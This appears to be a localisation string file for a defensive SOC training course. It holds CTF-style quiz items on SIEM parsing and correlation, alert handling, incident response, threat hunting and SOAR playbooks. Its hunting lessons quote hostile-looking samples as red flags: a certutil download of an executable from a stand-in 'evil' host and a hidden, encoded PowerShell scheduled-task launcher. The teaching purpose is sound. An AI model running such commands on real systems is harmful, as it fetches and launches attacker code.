tasks.teach: A source only helps once the SIEM can read it. You point the source at the SIEM (an agent like Wazuh/Beats, syslog, or an API), then confirm a parser maps its format to the normalised fields. The most common onboarding failure is a parsing failure — logs arrive but land as unparsed blobs, so rules never match them. Always verify fields are extracted, not just that data is flowing.
tasks.chal:
$ # confirm the source is ingesting AND parsed source=dc01 status=receiving eps=120 parser=windows_security parsed=OK source=fw01 status=receiving eps=90 parser=none parsed=FAIL <- unparsed!

What component maps a source's raw format to the SIEM's normalised fields? Submit TG{••••••}.
tasks.learn: Parser — 'logs are arriving' is not enough; confirm parsed=OK. An unparsed source is a silent blind spot.
tasks.example: fw01 above is ingesting but parser=none — its firewall denies never trigger rules until a parser is written. Verify parsing, always.

lab.intro: Confirm your sources are not just arriving but parsed.

steps.out:
dc01  receiving  parser=windows_security  parsed=OK
lnx01 receiving  parser=linux_auth        parsed=OK
fw01  receiving  parser=none             parsed=FAIL   <- fix the parser

steps2: List source status in the SIEM
Find the source arriving but not parsed
Name the component that must map its fields.

tasks.title: The value is in the correlation
tasks.teach: A single event rarely means much; the SIEM's power is correlation — logic that fires when events match a pattern, often across sources and time. A correlation rule encodes that pattern: 'many failed logins then a success from the same source' is far more meaningful than any one line. The output of a matched rule is an alert (or 'offence').
tasks.chal: What is the logic that fires when events match a defined pattern called (two words)? Submit TG{•••••••••••_••••}.
hints: It matches a pattern across events.
tasks.learn: Correlation rule — the heart of detection. 'The value is in the correlation': combining events reveals what single events hide.
tasks.example: Rule: 10+ logon_failed then 1 logon_success, same user+src, within 5 min → 'successful brute force' alert. Neither half alone would fire.

tasks.title: Write a brute-force rule
tasks.teach: Detection rules are where you encode what matters. A classic: Windows logs a failed logon as Event ID 4625 and a success as 4624. A brute-force rule counts 4625s by user/source over a window and fires on a threshold — and a better rule also looks for a following 4624 (the break-in succeeded).
tasks.chal:
SIEM search: event_id=4625 | stats count by user, src_ip | where count > 10 user=rnehra src_ip=203.0.113.9 count=47 <- brute force user=svc_sql src_ip=10.10.10.21 count=3 (normal)

Which Windows Event ID records a failed logon (the one a brute-force rule counts)? Submit TG{••••}.
tasks.learn: 4625 — failed logon. Count them by user/src over a window; add a trailing 4624 to catch the brute force that worked.
tasks.example: Tune the threshold to your baseline: a service account retrying 3× is normal; 47 failures from an external IP is an attack.

lab.intro: Search for brute-force sources in the SIEM.

steps.cmd: search event_id=4625 | stats count by user src_ip | where count>10
steps.out:
user=rnehra   src_ip=203.0.113.9  count=47
user=admin    src_ip=203.0.113.9  count=31

sugg: search event_id=4625 | stats count by user src_ip | where count>10

steps2: Run a count of failed logons grouped by user and source IP
Filter to sources over your threshold
Submit the Windows Event ID for a failed logon.

tasks.title: Enrichment
tasks.teach: Enrichment adds context to events at ingest so alerts arrive already prioritised. The big one is threat intelligence — 'is this IP/domain/hash known bad?' — but it also includes geo-location, asset criticality and user role. An alert enriched with 'src IP is a known C2 node, target is a domain controller' needs no research to prioritise.
tasks.chal: What is adding threat-intel, geo, asset and user context to events at ingest called? Submit TG{••••••••••}.
tasks.learn: Enrichment — it front-loads the research so Tier 1 can prioritise instantly. TI, geo, asset and identity are the common enrichments.
tasks.example: Before: 'connection to 185.23.44.9'. After enrichment: 'connection to 185.23.44.9 (known Cobalt Strike C2, RU)'. The alert prioritises itself.

tasks.title: UEBA
tasks.teach: Signatures and correlation catch known patterns; UEBA (User and Entity Behaviour Analytics) catches the unknown by building behavioural baselines for each user/host and flagging anomalies. It is how a SIEM detects things no static rule describes: a user logging in from two countries an hour apart (impossible travel), or an account suddenly touching systems it never uses.
tasks.chal: Which SIEM capability baselines normal behaviour per user/entity and flags anomalies? Submit TG{••••}.
tasks.learn: UEBA — anomaly detection on learned baselines. It catches impossible travel, dormant-account use and privilege anomalies that no signature anticipates.
tasks.example: Impossible travel: rnehra logs in from Delhi 09:00 and from Brazil 09:40 — physically impossible, so UEBA alerts even though each login looks valid.

tasks.title: Tuning
tasks.teach: A SIEM that cries wolf gets ignored, so tuning is continuous. You reduce false positives (benign events wrongly alerted) by refining thresholds, excluding known-good sources, and using multi-stage correlation so an alert needs several indicators, not one. The goal is the same as the whole SIEM: fewer, higher-confidence alerts.
tasks.chal: A benign event wrongly raised as an alert is a ___? Submit TG{•••••_••••••••}.
tasks.learn: False positive — tune them out with thresholds, exclusions and multi-stage correlation, without creating blind spots. Fidelity over volume.
tasks.example: Single-stage: 'any PowerShell download' (noisy). Multi-stage: 'PowerShell download then a new service then outbound to a new IP' — rare and real.

tasks.title: Scenario: a correlated intrusion
tasks.teach:
In the Innspark SIEM scenario, no single log was alarming. But correlated together they told a story: a burst of 4625 failures, then a 4624 success from the same external IP, then the account creating a new service and reaching across to another host, then a beacon outbound. Each stage enriched and linked, the SIEM raised one high-confidence incident instead of hundreds of disconnected events.

🔑 Key point

Correlation — the SIEM's defining power. Parsing, enrichment and storage all exist to make correlation possible; correlation is what turns noise into signal.
tasks.chal: What single SIEM capability turned those scattered events into one meaningful incident? Submit TG{•••••••••••}.
tasks.learn: Correlation — the SIEM's defining power. Parsing, enrichment and storage all exist to make correlation possible; correlation is what turns noise into signal.
tasks.example: The win: one incident ('successful brute force → lateral movement → C2') with a full timeline, instead of 400 raw 4625s nobody connects.

rooms.title: Log & Alert Management
rooms.subtitle: From a raw log line to a handled alert — the SOC data and signal lifecycle.
rooms.blurb: Collect, parse, retain and protect logs; generate, triage, deduplicate and tune alerts without blind spots.

tasks.title: Two disciplines, one lifecycle
tasks.teach:
This splits into two linked disciplines. Log management is the data side: collect, parse, store, retain the raw telemetry. Alert management is the signal side: generate, triage, deduplicate, tune, close the alerts that come from it. The full lifecycle is one line: log created at a source → collected & parsed → stored & retained → alert raised on a rule match → triaged → closed or escalated.

Both must be managed. Great logging with no alert discipline drowns you; great alerting on incomplete logs blinds you. The bridge between them is where detection happens.
tasks.chal: Which discipline covers collecting, parsing, storing and retaining the raw data (two words)? Submit TG{•••_••••••••••}.
hints: The data side, not the signal side.
tasks.learn: Log management — the data lifecycle. Alert management is the signal lifecycle on top of it; you need both.
tasks.example: Lifecycle: raw 4625 at DC01 → shipped & parsed → stored 90 days → brute-force rule fires → T1 triages → closed with a tuning note.

tasks.title: The log pipeline
tasks.teach: Logs flow collect → parse/normalise → enrich → store → retain. As in the SIEM, normalisation turns each source's raw format into common fields so everything downstream works. Enrichment adds context; storage tiers and retention decide how long you can search and prove what happened.
tasks.chal: Turning a raw log line into common fields (user, src, action, time) is called ___? Submit TG{•••••••••••••}.
tasks.learn: Normalisation — the shared vocabulary that makes search, correlation and reporting possible across every source.
tasks.example: Three firewalls, three formats → after normalisation all expose src_ip, action, dport — one query covers all three.

tasks.title: What to collect first
tasks.teach: You cannot collect everything on day one, so you prioritise by detection value. A sensible order puts authentication (who logged in where) and endpoints high, because that is where execution, persistence and privilege abuse show up. On Windows, the richest endpoint telemetry comes from Sysmon — process creation, network connections, image loads — far beyond the default event log.
tasks.chal: Which free Microsoft tool gives rich endpoint telemetry (process creation, network, image loads) for collection? Submit TG{••••••}.
tasks.learn: Sysmon — the single highest-value Windows source for detection. Pair it with auth logs and you cover most of the kill chain.
tasks.example: Default Windows logs show a logon; Sysmon shows the process that ran next, what it connected to, and what it spawned — the attack story.

tasks.title: Retention: hot and cold
tasks.teach: You keep logs in tiers. Hot storage is recent and immediately searchable (weeks to months) — where analysts work. Cold storage is cheaper archive (months to years) for compliance and deep forensics, slower to search. Retention is driven by policy and compliance; size it as EPS × event size × retention with headroom.
tasks.chal: Which storage tier holds recent logs that are immediately searchable? Submit TG{•••}.
tasks.learn: Hot — recent and fast. Cold is the cheaper long-term archive for compliance and historical investigations.
tasks.example: Typical policy: 90 days hot (daily work), 1–7 years cold (regulatory + reconstructing an old breach).

tasks.title: Log integrity
tasks.teach: Logs are only evidence if they can be trusted, and attackers try to erase or alter them to cover tracks. You protect integrity by forwarding logs off the source immediately (so local deletion doesn't lose them), restricting who can write to the store, and using WORM (Write Once, Read Many) storage or cryptographic hashing so stored logs cannot be tampered with after the fact.
tasks.chal: What write-once storage model prevents logs being altered or deleted after they are written? Submit TG{••••}.
tasks.learn: WORM — write once, read many. With off-host forwarding and hashing, it makes logs tamper-evident evidence an attacker cannot quietly rewrite.
tasks.example: Attacker clears the local Security log (event 1102) — but it was already forwarded to WORM storage, so the evidence survives.

tasks.title: The alert lifecycle
tasks.teach: Every alert moves through states: New → Acknowledged → In progress → Closed (or escalated). Tracking these states is what stops alerts being silently missed, and it gives you a key metric: MTTA — Mean Time to Acknowledge — how fast alerts get picked up. A low MTTA means someone is actually watching the queue.
tasks.chal:
ALERT QUEUE #1042 Brute force on DC01 NEW age 2m #1041 Malware on WS01 ACKNOWLEDGED age 14m #1039 Phishing click IN PROGRESS age 31m

Which metric measures how fast alerts get picked up (move from New to Acknowledged)? Submit TG{••••}.
tasks.learn: MTTA — the queue-responsiveness metric. Alerts sitting in NEW for hours mean nobody is watching; MTTA makes that visible.
tasks.example: States give accountability: an alert stuck in NEW is unowned; one IN PROGRESS has a name on it. The lifecycle is the audit trail.

lab.intro: Read the alert queue and its states.

steps.out:
#1042 Brute force DC01   NEW          2m
#1041 Malware WS01       ACKNOWLEDGED 14m
#1039 Phishing click     IN PROGRESS  31m

steps2: Open the alert queue
Note the state each alert is in (New → Acknowledged → …)
Name the metric for time-to-acknowledge.

tasks.title: Severity & prioritisation
tasks.teach: Not all alerts are equal. Severity (critical / high / medium / low) ranks how urgent an alert is, combining the threat with what it touches — a critical alert on a domain controller outranks a medium on a test box. Triage uses severity plus asset criticality and confidence to decide what to work first; you cannot do everything at once, so you work the highest-impact alerts first.
tasks.chal: What ranks how urgent an alert is (critical/high/medium/low)? Submit TG{••••••••}.
tasks.learn: Severity — combined with asset criticality and rule confidence, it drives the order you work the queue.
tasks.example: Same malware alert: on a kiosk → medium; on the CEO's laptop or a DC → critical. Severity must factor the asset, not just the signature.

tasks.title: Deduplication
tasks.teach: One real event can generate hundreds of identical alerts — an alert storm that buries everything else. Deduplication collapses repeated identical alerts into one (with a count), and correlation groups related alerts into a single incident. Together they turn 400 'failed login' alerts into one 'brute force (×400)' you can actually act on.
tasks.chal: What is collapsing repeated identical alerts into a single one called? Submit TG{•••••••••••••}.
tasks.learn: Deduplication — the first defence against alert storms. Correlation then groups the different-but-related alerts into one incident.
tasks.example: Without dedup: 400 separate rows. With dedup: Brute force on DC01 (count 400, first 09:02, last 09:08) — one actionable alert.

lab.intro: See how dedup collapses an alert storm.

steps.out:
Brute force on DC01   count=400   first=09:02  last=09:08   (deduplicated)
Malware on WS01       count=1

steps2: View the deduplicated alert queue
Note 400 raw events shown as one with a count
Name this collapsing of identical alerts.

tasks.title: Tune without blind spots
tasks.teach: Tuning fights alert fatigue — but the danger is over-tuning into a blind spot. The discipline: suppress known-good triggers, raise thresholds to your real baseline, and always ask 'what would this rule now miss?' You reduce false positives without silencing a rule's real detections. Document every suppression so a future analyst knows what was turned down and why.
tasks.chal: A benign event wrongly raised as an alert is a ___? Submit TG{•••••_••••••••}.
tasks.learn: False positive — tune it out carefully. Over-tune and you create a blind spot; the art is fewer alerts and no lost coverage.
tasks.example: Good: suppress the vuln scanner's IP from the 'port scan' rule. Bad: disable the 'port scan' rule entirely — now a real attacker scans unseen.

tasks.title: Scenario: the storm and the silence
tasks.teach:
Two failures, one shift. First an alert storm — one misconfigured app threw 10,000 identical alerts, burying a real intrusion; dedup and correlation would have collapsed it to one line. Second, a silent log source — a critical server quietly stopped sending logs days earlier, so its compromise produced no alerts at all. A source that goes silent is the most dangerous gap of all.

🔑 Key point

Blind spot — monitor your sources' heartbeats, not just their alerts. A source that stops logging must itself raise an alert, or its compromise is invisible.
tasks.chal: A log source that quietly stops sending data leaves the SOC with a ___ (two words)? Submit TG{•••••_••••}.
hints: You can't detect what you can't see.
tasks.learn: Blind spot — monitor your sources' heartbeats, not just their alerts. A source that stops logging must itself raise an alert, or its compromise is invisible.
tasks.example: Defence: a 'source went quiet' rule. If DC01 normally sends 120 EPS and drops to 0, that silence is itself the alert.

rooms.title: Incident Response
rooms.subtitle: Prepare, detect, contain, eradicate, recover — and learn.
rooms.blurb: Run the IR lifecycle: triage and scope, contain without destroying evidence, eradicate, recover and report.

tasks.title: The IR lifecycle
tasks.teach:
Incident response is not improvisation under pressure — it follows a lifecycle so that, when the worst happens, the team executes a plan instead of panicking. Two frameworks describe the same shape. NIST SP 800-61 uses four phases (Preparation; Detection & Analysis; Containment, Eradication & Recovery; Post-Incident Activity). The SANS model spells out six, remembered by the acronym PICERL: Prepare, Identify, Contain, Eradicate, Recover, Lessons learned.

Why it matters: each phase has a distinct goal, and skipping one causes the classic failures — containing before scoping (you miss hosts), eradicating before preserving evidence (you lose the investigation), recovering before eradicating (the attacker is still in). The lifecycle enforces the right order.
tasks.chal: What is the six-phase SANS incident-response model's acronym? Submit TG{••••••}.
hints: Prepare, Identify, Contain, Eradicate, Recover, Lessons.
tasks.learn: PICERL — the SANS lifecycle. NIST 800-61 groups the same work into four phases; both enforce doing things in the right order.
tasks.example: The order protects you: scope before you contain, preserve before you eradicate, eradicate before you recover, and always finish with lessons learned.

tasks.title: Preparation
tasks.teach: Most of IR's outcome is decided before the incident, in Preparation: a written IR plan, a trained team (the CSIRT) with defined roles, the tooling (EDR, SIEM, forensics, a jump kit), communication plans (who to call, how, with what authority), and rehearsals (tabletops). A team that prepared responds in minutes; one that didn't spends the first critical hour deciding who is in charge.
tasks.chal: Which phase covers building the plan, team, tooling and communications before any incident? Submit TG{•••••••••••}.
tasks.learn: Preparation — the phase that decides how well all the others go. Tabletops turn a plan into muscle memory.
tasks.example: A jump kit (clean laptop, write-blockers, tools), a contact tree, and a tested playbook mean the response starts in minutes, not meetings.

tasks.title: Detection, triage and declaring
tasks.teach: Incidents surface from alerts, users, threat intel or hunts. Detection & Analysis is where you triage (is this real?), scope (what else did this user/host/IP touch?), and classify severity (how bad, based on threat and asset). When the evidence crosses the bar, you formally declare an incident — which activates the plan, the team and the clock. Declaring too late is a common, costly mistake.
tasks.chal: What do you formally do to activate the IR plan and team once triage confirms a real incident? Submit TG{•••••••}.
tasks.learn: Declare — declaring an incident activates the CSIRT, the runbooks and the reporting clock. Scope first, then declare with confidence.
tasks.example: Triage: 'is the 4625 storm real?' Scope: 'did the 4624 succeed, and where did that account go?' Then declare and classify severity.

tasks.title: Containment
tasks.teach: Containment stops the spread without destroying evidence — the two goals that must be balanced. Short-term containment is fast and reversible (isolate a host from the network, disable an account, block a C2 IP); long-term containment is a sturdier hold while you prepare to eradicate. The golden rule: isolate, don't wipe — pulling the network cable (or EDR-isolating) preserves memory and disk for the investigation.
tasks.chal:
$ edr isolate --host WS01 --reason "IR-2026-114 contain" WS01: network isolated (mgmt channel only). Memory & disk preserved.

Which phase stops the attack spreading while preserving evidence? Submit TG{•••••••••••}.
tasks.learn: Containment — stop the bleeding without destroying the crime scene. EDR isolation keeps the host investigable while cutting the attacker off.
tasks.example: Reboot/wipe = evidence gone (memory, running malware). EDR-isolate = attacker cut off, memory and disk intact for forensics.

lab.intro: Isolate a compromised host while preserving evidence.

steps.out:
WS01: network isolated (management channel only)
Memory and disk preserved for forensics. Attacker C2 cut off.

steps2: In the EDR, isolate the host (do not reboot or wipe)
Confirm memory/disk are preserved
Name this IR phase (one word).

tasks.title: Eradication
tasks.teach: Once contained and scoped, Eradication removes the attacker's foothold entirely — all malware, persistence mechanisms, created accounts, web shells and backdoors, across every affected host. Half-eradication is how attackers come straight back: miss one scheduled task or one rogue admin account and they re-enter. This is why scoping in the previous phase matters so much.
tasks.chal: Which phase completely removes the attacker's foothold (malware, persistence, rogue accounts)? Submit TG{•••••••••••}.
tasks.learn: Eradication — remove it all, everywhere, or they return through the piece you missed. Often a clean rebuild from known-good images beats surgical cleaning.
tasks.example: Checklist: kill malware, remove persistence (run keys, services, tasks), delete attacker accounts, rotate compromised creds, patch the entry point.

tasks.title: Recovery
tasks.teach: Recovery returns systems to normal operation and validates that they are clean and that the attacker is gone. You restore from trusted backups or rebuilt images, bring services back in a controlled way, and monitor closely for signs of return. Recovery is deliberately cautious — rushing it (bringing systems back before eradication is verified) restarts the incident.
tasks.chal: Which phase restores systems to normal and validates they are clean? Submit TG{••••••••}.
tasks.learn: Recovery — restore, validate, monitor. Heightened monitoring afterwards catches an attacker trying to re-enter a 'recovered' environment.
tasks.example: Validate before declaring victory: confirm persistence is gone, creds rotated, the entry vector closed, and watch the restored hosts closely for a week.

tasks.title: Lessons learned
tasks.teach: The phase everyone is tempted to skip, and the one that pays forward. Lessons learned (post-incident activity) is an honest, blameless retro: what happened, how fast we detected and responded, what worked, what didn't, and what we will change — detections to add, gaps to close, runbooks to update. Every incident should make the next one less likely or less damaging.
tasks.chal: What is the final IR phase — the blameless retro that turns an incident into improvements (two words)? Submit TG{•••••••_•••••••}.
tasks.learn: Lessons learned — turn the pain into new detections and better runbooks. An incident you don't learn from, you will relive.
tasks.example: Output: 'add a rule for the persistence technique used; the backup restore took 9h — fix it; the on-call tree had a wrong number.' Concrete actions, owners, dates.

tasks.title: Evidence & chain of custody
tasks.teach: If an incident might lead to legal action, discipline or insurance, the evidence must stand up. Chain of custody is the documented, unbroken record of who collected each piece of evidence, when, how, and everyone who handled it since. Collect in order of volatility (memory before disk), hash everything to prove it hasn't changed, and work on copies, never originals.
tasks.chal:
evidence: WS01_memory.raw sha256: 4f2a...e91c collected 2026-10-30 09:40 by R.Nehra (IR-2026-114) handoff: -> forensics (A.Kumar) 10:05, hash re-verified: MATCH

What is the documented, unbroken record of who handled each piece of evidence called (three words)? Submit TG{•••••_••_•••••••}.
hints: Who touched the evidence, and when.
tasks.learn: Chain of custody — with hashing and copies, it makes evidence trustworthy and admissible. Break it and the evidence may be worthless.
tasks.example: Order of volatility: capture RAM first (it vanishes on power-off), then disk. Hash on collection and re-verify on every handoff.

tasks.title: Reporting obligations
tasks.teach: Incidents often come with legal reporting duties, and the clock is short. In India, CERT-In (the national Computer Emergency Response Team) requires certain incidents to be reported within its timeline — currently 6 hours of noticing. Knowing your obligations (CERT-In, sector regulators, data-protection law, contractual duties) and building them into the plan means you report in time instead of discovering the deadline after you've missed it.
tasks.chal: Which Indian national body must certain incidents be reported to (within 6 hours)? Submit TG{••••-••}.
tasks.learn: CERT-In — India's national CERT; certain incidents are reportable within 6 hours. Bake reporting triggers and contacts into the IR plan.
tasks.example: Preparation pays off here too: a pre-written CERT-In report template and known contacts turn a frantic deadline into a form you fill in.

tasks.title: Scenario: ransomware, end to end
tasks.teach:
A ransomware alert fires. The team scopes (which hosts encrypted, patient zero, the entry vector), contains (isolate affected hosts, disable the spread account, block C2), eradicates (remove the malware and persistence, rotate creds, patch the entry), recovers (restore from offline backups, validate), reports to CERT-In in time, and runs lessons learned. Afterwards they measure how long the attacker was in before detection — the metric that most predicts damage.

🔑 Key point

Dwell time — alongside MTTD, MTTC (contain) and MTTR, it is the headline IR metric. Shorter dwell = less damage; the whole lifecycle exists to cut it.
tasks.chal: What is the term for the time an attacker is present and undetected in the environment? Submit TG{•••••_••••}.
hints: How long they were in before you noticed.
tasks.learn: Dwell time — alongside MTTD, MTTC (contain) and MTTR, it is the headline IR metric. Shorter dwell = less damage; the whole lifecycle exists to cut it.
tasks.example: The win condition: detect and contain before encryption completes. Offline, tested backups are what turn ransomware from catastrophe into cleanup.

rooms.title: Threat Hunting
rooms.subtitle: Proactively find the attacker your detections missed.
rooms.blurb: Adopt assume-breach, form hypotheses from ATT&CK, hunt with stacking and pivoting, and promote finds to detections.

tasks.title: Hunting vs alerting
tasks.teach:
Alerting is reactive — you wait for a rule to fire. Threat hunting is proactive — you go looking for the attacker your detections missed, on the assumption that something already got through. That is the assume-breach mindset: instead of 'are we compromised?', the hunter asks 'given that we may be compromised, where would I find the evidence?'

Why it matters: every detection has gaps (novel TTPs, living-off-the-land, slow attackers). Hunting is how you find what slipped through those gaps — and then close them by turning each find into a new rule.
tasks.chal: What is the core hunting mindset — acting as though an attacker is already inside? Submit TG{••••••_••••••}.
hints: Not 'are we breached' but 'where's the evidence'.
tasks.learn: Assume breach — hunt as if the attacker is already in. It reframes the question from detection to discovery.
tasks.example: Alerting: 'the rule for X fired.' Hunting: 'we have no rule for X — let me look for signs of X anyway, then write the rule.'

tasks.title: The hunting loop
tasks.teach: Hunting is a disciplined loop, not random searching: Hypothesise → Hunt → Find → Detect (promote). You start with a testable hypothesis ('if an attacker used technique T, I would see artefact A in data D'), hunt for that artefact, analyse what you find, and whatever you learn feeds back — a find becomes an incident and a new detection; a clean hunt still documents coverage.
tasks.chal: What does every hunt start with — a testable statement about attacker behaviour? Submit TG{••••••••••}.
hints: 'If technique T, then artefact A in data D.'
tasks.learn: Hypothesis — the hunt's anchor. Without one you are just browsing logs; with one, a hunt has a clear question and a clear answer.
tasks.example: Hypothesis: 'If an attacker is beaconing, I'll see regular small outbound flows to a rare external IP in the proxy logs.' Now you can hunt it.

tasks.title: Where hypotheses come from
tasks.teach: Good hypotheses come from four wells: MITRE ATT&CK (hunt a technique you can't yet detect), threat intel (hunt a TTP a relevant actor is using), anomalies (something looks off in a baseline), and your crown jewels — the few assets whose compromise would hurt most (the domain controllers, the customer database, the code-signing key). Hunting around crown jewels concentrates effort where it matters.
tasks.chal: What term describes the highest-value assets you hunt around first? Submit TG{•••••_••••••}.
hints: The assets you can't afford to lose.
tasks.learn: Crown jewels — focus hunts where a compromise would be catastrophic. ATT&CK, intel and anomalies are the other hypothesis sources.
tasks.example: Crown-jewel hunt: 'who authenticated to DC01 outside normal admin hours, from a non-admin workstation, in the last 30 days?'

tasks.title: The Pyramid of Pain
tasks.teach: David Bianco's Pyramid of Pain ranks indicators by how much it hurts the attacker when you detect on them. At the bottom are trivial-to-change indicators — hashes, IPs, domains — an attacker swaps these in seconds. At the top are TTPs (tactics, techniques, procedures) — the way they actually operate — which are expensive and painful for them to change. Hunting and detecting at the TTP level imposes real cost and catches the attacker even when they change their tools.
tasks.chal: At which level of the Pyramid of Pain does detection hurt the attacker most (hardest to change)? Submit TG{••••}.
tasks.learn: TTPs — behaviour, not artefacts. Hashes/IPs are cheap to change; a technique (how they move laterally) is not. Hunt behaviour.
tasks.example: Block a hash → they recompile in minutes. Detect their technique (e.g. PsExec-style lateral movement) → they must change how they operate.

tasks.title: Stacking & frequency analysis
tasks.teach: The core hunting techniques are searching, pivoting, clustering — and especially stacking (frequency analysis). You take a field across all hosts (e.g. every parent-child process pair, or every autorun) and count occurrences. The least-frequent values are where evil hides: on a fleet of identical machines, the process that runs on exactly one host, or the one scheduled task nobody else has, stands out instantly.
tasks.chal:
$ hunt stack --field process_path --sort asc | head 2412 C:\Windows\System32\svchost.exe 980 C:\Program Files\...\chrome.exe 1 C:\Users\Public\u8f3.exe <- runs on ONE host only — investigate

What is the technique of counting a field's values to surface the rare, suspicious ones called? Submit TG{••••••••}.
tasks.learn: Stacking — frequency analysis. On uniform fleets, rarity is a strong signal; the one-off binary or task is your lead.
tasks.example: Stack autoruns across 500 machines: the 499 that match are the baseline; the one unique entry is the persistence you were hunting.

lab.intro: Stack a field to find the rarest, most suspicious value.

steps.out:
2412  C:\\Windows\\System32\\svchost.exe
   980  chrome.exe
     1  C:\\Users\\Public\\u8f3.exe   <- one host only: hunt lead

steps2: Stack-count a field (process path, autorun, scheduled task) across the fleet
Sort ascending — the least-frequent rows are your leads
Name this frequency-analysis technique.

tasks.title: Hunt for persistence
tasks.teach: Attackers need to survive reboots, so persistence is a rich hunting ground. On Windows the usual spots are Run/RunOnce registry keys, scheduled tasks, services, startup folders and WMI subscriptions. A hunt stacks these across the fleet and investigates the rare or oddly-named entries — a scheduled task calling PowerShell with an encoded command is a classic find.
tasks.chal: What do we call the attacker techniques (run keys, scheduled tasks, services) used to survive a reboot? Submit TG{•••••••••••}.
tasks.learn: Persistence — hunt autoruns, tasks and services; stack them and chase the outliers. Sysmon + ATT&CK (TA0003) guide where to look.
tasks.example: Find: a scheduled task Updater running powershell -enc SQBFAFgA... every 10 min — encoded command + odd task = persistence worth escalating.

lab.intro: Hunt scheduled-task persistence for an encoded PowerShell launcher.

steps.out: TASK "Updater"  ->  powershell.exe -nop -w hidden -enc SQBFAFgA...   host=WS07   <- suspicious

steps2: Hunt scheduled tasks whose action contains an encoded command (-enc)
Investigate odd task names running PowerShell
Name this category of attacker technique.

tasks.title: Hunt for C2 beacons
tasks.teach:
Command-and-control traffic is regular and quiet, which is exactly what makes it huntable. A beacon is a small, periodic callback to the attacker's server — same destination, roughly fixed interval, low volume. You hunt it in flow/proxy data by looking for connections with high regularity to a rare external destination, even when the payload is encrypted.

🔑 Key point

Beaconing — regularity is the tell. TLS hides the payload, but timing and a rare destination give it away in the metadata.
tasks.chal: What is the attacker's regular, low-volume callback to its C2 server called? Submit TG{•••••••••}.
tasks.learn: Beaconing — regularity is the tell. TLS hides the payload, but timing and a rare destination give it away in the metadata.
tasks.example: Hunt: group proxy logs by destination, compute interval variance; a destination hit every 60s ±2s by one host is a beacon, not a human.

tasks.title: Living off the land
tasks.teach: Modern attackers avoid dropping malware and instead abuse legitimate built-in tools — PowerShell, certutil, rundll32, wmic, bitsadmin — to blend in. These are LOLBins (Living Off the Land Binaries). Signatures struggle because the binaries are trusted; you hunt them behaviourally — the right tool doing the wrong thing (certutil downloading a file, rundll32 making a network connection).
tasks.chal: What are legitimate built-in binaries that attackers abuse to evade detection called? Submit TG{•••••••}.
tasks.learn: LOLBins — trusted tools used maliciously. Hunt by behaviour and context, not by the binary's name, since the binary itself is legitimate.
tasks.example: Red flag: certutil -urlcache -f http://evil/x.exe x.exe — a certificate tool downloading an executable. Legitimate binary, malicious use.

tasks.title: Promote finds to detections
tasks.teach: A hunt that finds something and stops has wasted most of its value. The discipline is to promote every find to a detection — turn the query that caught it into a tuned, documented rule so the SOC catches it automatically next time. This is how hunting steadily shrinks the gaps: today's hard-won manual find is tomorrow's Tier-1 alert.
tasks.chal: You turn a successful hunt query into a lasting, automated ___ so it's caught next time? Submit TG{•••••••••}.
hints: A rule the SOC runs automatically.
tasks.learn: Detection — promoting finds to detections closes the loop and is how a hunt program measurably improves coverage over time.
tasks.example: Find a beacon by hand → write the 'regular rare-destination' rule → it now fires automatically, and you hunt the next gap.

tasks.title: Scenario: the hunt that found what alerts missed
tasks.teach:
Nothing had alerted — the attacker used LOLBins and encrypted C2. A hunter, assuming breach, hypothesised lateral movement around the crown-jewel servers, stacked authentication and process data, and surfaced a single host running an odd encoded-PowerShell scheduled task beaconing to a rare IP. The find became an incident and three new detections. The whole practice is defined by one approach.

🔑 Key point

Hypothesis-driven — the disciplined core of hunting. Assume breach, form a hypothesis, hunt the data, promote finds. It catches what rules alone never will.
tasks.chal: Hunting that starts from a testable statement about attacker behaviour is best described as ___ hunting (two words)? Submit TG{••••••••••_••••••}.
hints: Led by a hypothesis, not a tool.
tasks.learn: Hypothesis-driven — the disciplined core of hunting. Assume breach, form a hypothesis, hunt the data, promote finds. It catches what rules alone never will.
tasks.example: The payoff: an attacker invisible to every signature was found by a human asking the right question of the right data — then made catchable forever.

rooms.title: SOAR & Security Automation
rooms.subtitle: Turn an alert into an enriched, decided, actioned case — humans kept for judgement.
rooms.blurb: Build trigger→enrich→decide→act playbooks with connectors, approval gates and guardrails — using Innspark SOAR.

tasks.title: What SOAR solves
tasks.teach: SOAR — Security Orchestration, Automation and Response — exists to kill toil: the repetitive, manual, low-judgement work that eats a SOC's time (looking up an IP's reputation, screenshotting a URL, opening a ticket, blocking an indicator). SOAR orchestrates your tools (connects them), automates the toil (playbooks do the repetitive steps), and speeds response — while keeping humans for the decisions that need judgement. (The TG handbook uses Innspark SOAR as its running example.)
tasks.chal: What is the repetitive, manual, low-judgement work that SOAR automates away called? Submit TG{••••}.
tasks.learn: Toil — automate it so analysts spend their time on judgement, not copy-paste. Faster, consistent, and less burnout.
tasks.example: Toil: 'for every phishing report, look up the sender, detonate the link, check the hash, open a ticket.' Perfect for a playbook; no judgement needed.

tasks.title: The playbook model
tasks.teach: Every SOAR playbook follows the same shape: Trigger → Enrich → Decide → Act (with Approve where needed). A trigger starts it (an alert, an email, a schedule, a manual run); enrich gathers context automatically; decide branches on that context; act performs the response. Learning to think in these four steps lets you design a playbook for almost anything.
tasks.chal: What is the first step of a playbook — the event that starts it running? Submit TG{•••••••}.
hints: An alert, email, schedule or manual start.
tasks.learn: Trigger — what kicks the playbook off. Then enrich (gather), decide (branch), act (respond), with approval gates on risky actions.
tasks.example: Phishing playbook: trigger = user reports an email → enrich = look up sender/URL/attachment → decide = malicious? → act = quarantine + block + ticket.

tasks.title: Enrichment
tasks.teach: The enrich step is where a playbook earns its keep: it automatically gathers the context a human would otherwise collect by hand — threat-intel reputation of IPs/domains/hashes, WHOIS and geo, asset and user details, related alerts, URL detonation in a sandbox. By the time a human sees the case, every lookup is done and attached.
tasks.chal:
[playbook: phish-triage] step 2 sender_ip 203.0.113.9 -> TI: MALICIOUS (C2, confidence 95%) url hxxp://evil/login -> sandbox: credential-harvest page attachment sha256 4f2a -> VT: 58/70 engines

Which playbook step automatically gathers threat-intel, geo and asset context? Submit TG{••••••}.
tasks.learn: Enrich — front-loads all the lookups so the human decision is fast and informed. It is usually the biggest time-saver in a playbook.
tasks.example: Manual: 10 minutes of tabs and lookups per alert. Enriched: the same facts attached in seconds, every time, consistently.

tasks.title: Connectors & orchestration
tasks.teach: SOAR's power is orchestration — making separate tools work together — and that runs on connectors (integrations): the API links that let a playbook query the SIEM, look up threat intel, isolate a host in the EDR, block an IP on the firewall, and open a case. A SOAR with rich connectors can act across the whole stack; without them it can only watch.
tasks.chal: What are the API integrations that let SOAR query and control other tools called? Submit TG{••••••••••}.
hints: The links to the SIEM, EDR, firewall, TI.
